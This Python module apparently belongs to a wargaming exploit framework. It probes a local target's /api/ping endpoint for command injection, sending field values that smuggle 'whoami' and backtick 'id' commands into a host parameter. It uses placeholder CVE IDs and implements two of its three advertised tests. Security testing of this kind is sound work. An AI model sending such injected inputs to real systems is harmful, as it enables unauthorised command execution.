"""
Command Injection Exploit
Tests: CVE-2022-TEST-CMD, CWE-78

Validates command injection vulnerabilities by attempting to execute
OS commands through unsanitized input fields.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import httpx
import asyncio
from typing import Dict
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))
from exploit_database import ExploitResult, ExploitStatus, ExploitCategory

# Exploit Metadata
EXPLOIT_ID = "EXPLOIT-CMD-001"
NAME = "Command Injection via Shell"
DESCRIPTION = "Tests OS command injection through shell=True vulnerabilities"
CATEGORY = ExploitCategory.COMMAND_INJECTION.value
CWE_IDS = ["CWE-78", "CWE-77"]
CVE_EXAMPLES = ["CVE-2022-TEST-CMD", "CVE-2024-CMD-INJECTION"]


async def execute(target_url: str, timeout: int = 10, **kwargs) -> ExploitResult:
    """
    Execute command injection exploit.
    
    Tests:
    1. Simple command injection with semicolon
    2. Command substitution with backticks
    3. Command substitution with $()
    
    Args:
        target_url: Base URL of vulnerable target
        timeout: Max execution time in seconds
        
    Returns:
        ExploitResult with success/failure status
    """
    import time
    start_time = time.time()
    
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            # Test 1: Simple command injection
            payload1 = {
                "host": "127.0.0.1; whoami"
            }
            
            response1 = await client.post(
                f"{target_url}/api/ping",
                json=payload1
            )
            
            output1 = response1.json()
            
            # Check if command executed (whoami output present)
            if response1.status_code == 200 and "root" in output1.get("output", "").lower():
                duration = time.time() - start_time
                return ExploitResult(
                    exploit_id=EXPLOIT_ID,
                    category=ExploitCategory.COMMAND_INJECTION,
                    status=ExploitStatus.SUCCESS,
                    success=True,
                    output=f"Command injection successful! Executed 'whoami': {output1.get('output', '')[:200]}",
                    error=None,
                    duration_seconds=duration,
                    metadata={
                        "injection_point": "/api/ping",
                        "payload": payload1,
                        "technique": "semicolon_separator"
                    }
                )
            
            # Test 2: Command substitution with backticks
            payload2 = {
                "host": "127.0.0.1 `id`"
            }
            
            response2 = await client.post(
                f"{target_url}/api/ping",
                json=payload2
            )
            
            output2 = response2.json()
            
            if response2.status_code == 200 and ("uid=" in output2.get("output", "") or "gid=" in output2.get("output", "")):
                duration = time.time() - start_time
                return ExploitResult(
                    exploit_id=EXPLOIT_ID,
                    category=ExploitCategory.COMMAND_INJECTION,
                    status=ExploitStatus.SUCCESS,
                    success=True,
                    output=f"Command injection via backticks! Executed 'id': {output2.get('output', '')[:200]}",
                    error=None,
                    duration_seconds=duration,
                    metadata={
                        "injection_point": "/api/ping",
                        "payload": payload2,
                        "technique": "backtick_substitution"
                    }
                )
            
            # No vulnerability detected
            duration = time.time() - start_time
            return ExploitResult(
                exploit_id=EXPLOIT_ID,
                category=ExploitCategory.COMMAND_INJECTION,
                status=ExploitStatus.FAILED,
                success=False,
                output="No command injection vulnerability detected",
                error=None,
                duration_seconds=duration,
                metadata={"tests_attempted": 2}
            )
            
    except httpx.TimeoutException:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.COMMAND_INJECTION,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="",
            error="Timeout during exploit execution",
            duration_seconds=duration,
            metadata={}
        )
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.COMMAND_INJECTION,
            status=ExploitStatus.ERROR,
            success=False,
            output="",
            error=str(e),
            duration_seconds=duration,
            metadata={}
        )


# Test standalone execution
if __name__ == "__main__":
    import asyncio
    
    async def test():
        result = await execute("http://localhost:8094")
        print(f"\n{'='*60}")
        print(f"Exploit: {NAME}")
        print(f"Status: {result.status.value}")
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Output: {result.output}")
        if result.error:
            print(f"Error: {result.error}")
        print(f"{'='*60}\n")
    
    asyncio.run(test())
